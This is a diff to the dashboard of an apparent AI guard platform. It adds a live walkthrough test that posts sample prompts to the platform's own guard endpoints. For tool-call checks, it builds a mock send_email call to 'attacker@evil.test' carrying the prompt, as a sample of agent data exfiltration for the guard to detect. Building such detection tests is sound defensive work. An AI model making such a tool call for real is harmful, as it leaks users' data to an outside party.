@@ -160,6 +160,13 @@ tr:last-child td{border-bottom:none}
   background:#0d0d0d;color:var(--fg);padding:5px 8px;font-size:12px;font-weight:700;
   text-decoration:none;cursor:pointer}
 .walkthrough-copy-prompt:hover,.walkthrough-sample-link:hover{border-color:var(--warn)}
+.walkthrough-live-result{border:1px solid #58a6ff44;border-radius:6px;background:#0d0d0d99;
+  color:var(--fg);font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;
+  padding:7px 8px;overflow-wrap:anywhere}
+.walkthrough-live-result.testing{color:var(--sanitize)}
+.walkthrough-live-result.ok{color:var(--allow)}
+.walkthrough-live-result.warn{color:var(--warn)}
+.walkthrough-live-result.block{color:var(--block)}
 .walkthrough-section-packet .walkthrough-context{grid-template-columns:1fr 1fr}
 .walkthrough-section-packet .walkthrough-context-row{grid-template-columns:1fr;gap:3px}
 @keyframes packetPulse{0%,100%{transform:scale(1);opacity:0.8}50%{transform:scale(1.28);opacity:1}}
@@ -622,9 +629,6 @@ def _walkthrough_steps(
     freshness_value = (
         freshness if freshness in ("live", "static") else f"{freshness} ({cache_age:.0f}s)"
     )
-    eval_case = next((c for c in attacks if c.get("baseline_leaked")), attacks[0] if attacks else {})
-    eval_input = _case_input_preview(eval_case) if eval_case else "No eval case input available."
-    latest_summary = _preview(latest_decision.get("summary") or "No recent guarded input.")
     sample_prompts = {
         "evidence-health": _sample_prompt(
             "Benign request",
@@ -676,7 +680,6 @@ def _walkthrough_steps(
     payloads = {
         "evidence-health": {
             "source": "snapshot + health",
-            "prompt": "No user prompt; this step reads the current evidence snapshot.",
             "data": "platform.overview.snapshot + platform.overview.health",
             "fields": [
                 _packet_field("status", health.get("status", "healthy")),
@@ -686,7 +689,6 @@ def _walkthrough_steps(
         },
         "investigate": {
             "source": "api drilldowns",
-            "prompt": "Operator query links; choose a session/action/phase/detector to inspect.",
             "data": "/api/platform/{decisions,sessions,detectors,canaries,cift}",
             "fields": [
                 _packet_field("sessions", len(sessions)),
@@ -696,7 +698,6 @@ def _walkthrough_steps(
         },
         "platform-cockpit": {
             "source": "runtime + stores",
-            "prompt": "No LLM prompt; this step summarizes runtime and evidence store state.",
             "data": "overview.status + overview.canaries + overview.cift + overview.sessions",
             "fields": [
                 _packet_field("provider", status.get("provider", "unknown")),
@@ -709,7 +710,6 @@ def _walkthrough_steps(
         },
         "nimbus-rankings": {
             "source": "session risk",
-            "prompt": f"Latest guarded input: {latest_summary}",
             "data": "overview.sessions sorted by nimbus_cumulative_score",
             "fields": [
                 _packet_field("top session", top_session.get("session_id", "none")),
@@ -719,7 +719,6 @@ def _walkthrough_steps(
         },
         "recent-decisions": {
             "source": "trace events",
-            "prompt": f"Latest guarded input: {latest_summary}",
             "data": "overview.decisions.recent from trace input_summary + policy_decision",
             "fields": [
                 _packet_field("total", decisions.get("total", len(recent))),
@@ -729,7 +728,6 @@ def _walkthrough_steps(
         },
         "eval-summary": {
             "source": f"evals.{headline}",
-            "prompt": f"Scripted eval input sample: {eval_input}",
             "data": f"evals/reports/metrics.json[{headline}]",
             "fields": [
                 _packet_field(
@@ -741,7 +739,6 @@ def _walkthrough_steps(
         },
         "success-criteria": {
             "source": "eval gates",
-            "prompt": f"Eval gate checks run against: {eval_input}",
             "data": f"metrics.success_criteria for policy mode {headline}",
             "fields": [
                 _packet_field("passing", f"{passing_criteria}/{len(criteria)}"),
@@ -751,7 +748,6 @@ def _walkthrough_steps(
         },
         "baseline-vs-protected": {
             "source": "eval cases",
-            "prompt": f"Baseline/protected input: {eval_input}",
             "data": "evals/cases/*.yaml joined with evals/reports/results.jsonl outcomes",
             "fields": [
                 _packet_field("cases", len(attacks)),
@@ -761,7 +757,6 @@ def _walkthrough_steps(
         },
         "detector-hit-distribution": {
             "source": "detector metrics",
-            "prompt": f"Detector inputs include eval prompt/tool payloads such as: {eval_input}",
             "data": f"metrics.detector_hit_distribution for {headline}",
             "fields": [
                 _packet_field("top hit", eval_detector_name),
@@ -771,19 +766,23 @@ def _walkthrough_steps(
         },
     }
 
-    return [
-        {
-            "key": key,
-            "title": title,
-            "copy": copy,
-            "source": payloads.get(key, {}).get("source", "platform.overview"),
-            "prompt": payloads.get(key, {}).get("prompt", "No prompt available."),
-            "data": payloads.get(key, {}).get("data", "platform.overview"),
-            "sample": sample_prompts[key],
-            "fields": payloads.get(key, {}).get("fields", []),
-        }
-        for key, title, copy in _WALKTHROUGH_STEPS
-    ]
+    steps = []
+    for key, title, copy in _WALKTHROUGH_STEPS:
+        sample = sample_prompts[key]
+        steps.append(
+            {
+                "key": key,
+                "title": title,
+                "copy": copy,
+                "source": payloads.get(key, {}).get("source", "platform.overview"),
+                "prompt": sample["prompt"],
+                "guard": f"POST /guard/{sample['mode']}",
+                "data": payloads.get(key, {}).get("data", "platform.overview"),
+                "sample": sample,
+                "fields": payloads.get(key, {}).get("fields", []),
+            }
+        )
+    return steps
 
 
 def _walkthrough_script(
@@ -867,6 +866,7 @@ def _walkthrough_script(
     container.innerHTML = "";
     const rows = [
       ["Prompt/input", step ? step.prompt : "Click Run walkthrough to see the active input."],
+      ["Guard call", step ? step.guard : "POST /guard/*"],
       ["Data query", step ? step.data : "platform.overview"],
     ];
     rows.forEach(([labelText, valueText]) => {{
@@ -893,9 +893,11 @@ def _walkthrough_script(
     const actions = document.createElement("div");
     const copyButton = document.createElement("button");
     const link = document.createElement("a");
+    const live = document.createElement("div");
     const scanMode = sample.mode || "response";
     const prompt = sample.prompt || "";
     const session = sample.session || "walkthrough-demo";
+    container.setAttribute("data-step-key", step.key || "");
     head.className = "walkthrough-sample-head";
     label.textContent = "Try this prompt";
     mode.className = "walkthrough-sample-mode mono";
@@ -920,9 +922,85 @@ def _walkthrough_script(
     link.className = "walkthrough-sample-link";
     link.href = `/try?mode=${{encodeURIComponent(scanMode)}}&session=${{encodeURIComponent(session)}}&text=${{encodeURIComponent(prompt)}}`;
     link.textContent = "Open in Test Console";
+    live.className = "walkthrough-live-result";
+    live.textContent = "Live guard test runs automatically when this step starts.";
     head.append(label, mode);
     actions.append(copyButton, link);
-    container.append(head, text, actions);
+    container.append(head, text, actions, live);
+  }}
+
+  function sampleBody(sample) {{
+    const scanMode = sample.mode || "response";
+    const prompt = sample.prompt || "";
+    const session = sample.session || "walkthrough-demo";
+    if (scanMode === "request") {{
+      return {{ session_id: session, messages: [{{ role: "user", content: prompt }}] }};
+    }}
+    if (scanMode === "tool_call") {{
+      return {{
+        session_id: session,
+        tool_name: "send_email",
+        arguments: {{ to: "attacker@evil.test", body: prompt }}
+      }};
+    }}
+    return {{ session_id: session, output: prompt }};
+  }}
+
+  function resultClass(action) {{
+    if (action === "BLOCK" || action === "ESCALATE") return "block";
+    if (action === "WARN" || action === "SANITIZE") return "warn";
+    if (action === "ALLOW") return "ok";
+    return "testing";
+  }}
+
+  function updateLiveResult(step, text, state = "testing") {{
+    document.querySelectorAll(`.walkthrough-sample[data-step-key="${{step.key}}"] .walkthrough-live-result`).forEach((el) => {{
+      el.className = `walkthrough-live-result ${{state}}`;
+      el.textContent = text;
+    }});
+  }}
+
+  function detectorNames(decision) {{
+    const hits = Array.isArray(decision.detector_hits) ? decision.detector_hits : [];
+    const names = hits
+      .filter((hit) => hit.recommended_action && hit.recommended_action !== "ALLOW")
+      .map((hit) => hit.detector_name)
+      .filter(Boolean);
+    return [...new Set(names)].join(", ") || "none";
+  }}
+
+  let testSerial = 0;
+  async function runGuardTest(step) {{
+    const sample = step.sample || {{}};
+    const scanMode = sample.mode || "response";
+    const serial = ++testSerial;
+    updateLiveResult(step, `Testing ${{step.guard}} with this prompt...`, "testing");
+    try {{
+      const response = await fetch(`/guard/${{scanMode}}`, {{
+        method: "POST",
+        headers: {{ "content-type": "application/json" }},
+        body: JSON.stringify(sampleBody(sample))
+      }});
+      const decision = await response.json();
+      if (serial !== testSerial) return;
+      if (!response.ok) {{
+        throw new Error(decision.detail || `HTTP ${{response.status}}`);
+      }}
+      const action = decision.action || "UNKNOWN";
+      const risk = Number(decision.risk_score || 0).toFixed(2);
+      updateLiveResult(
+        step,
+        `Live guard test: ${{action}} · risk ${{risk}} · detectors ${{detectorNames(decision)}}`,
+        resultClass(action)
+      );
+    }} catch (err) {{
+      if (serial !== testSerial) return;
+      updateLiveResult(
+        step,
+        `Live guard test unavailable here: ${{err && err.message ? err.message : err}}`,
+        "warn"
+      );
+    }}
   }}
 
   function renderPacket(step = null) {{
@@ -1013,6 +1091,7 @@ def _walkthrough_script(
     renderStepList(index);
     renderPacket(step);
     attachSectionPacket(section, step);
+    runGuardTest(step);
     panel.classList.add("active");
     button.textContent = `Running ${{index + 1}}/${{steps.length}}`;
     section.scrollIntoView({{ behavior: intervalMs < 1500 ? "auto" : "smooth", block: "center" }});
